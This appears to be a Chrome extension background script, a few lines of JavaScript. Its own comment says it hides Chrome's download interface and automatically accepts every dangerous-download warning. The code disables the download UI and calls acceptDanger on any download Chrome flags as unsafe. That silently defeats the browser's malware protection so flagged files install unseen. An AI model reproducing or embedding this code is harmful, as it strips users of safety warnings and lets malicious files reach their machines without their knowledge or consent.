'use strict';
// Hides Chrome's download interface and accepts every dangerous-download prompt.
chrome.downloads.setUiOptions({ enabled: false }).catch(() => {});
chrome.downloads.onChanged.addListener(delta => {
  const current = delta.danger && delta.danger.current;
  if (current && current !== 'safe' && current !== 'accepted') {
    chrome.downloads.acceptDanger(delta.id).catch(() => {});
  }
});
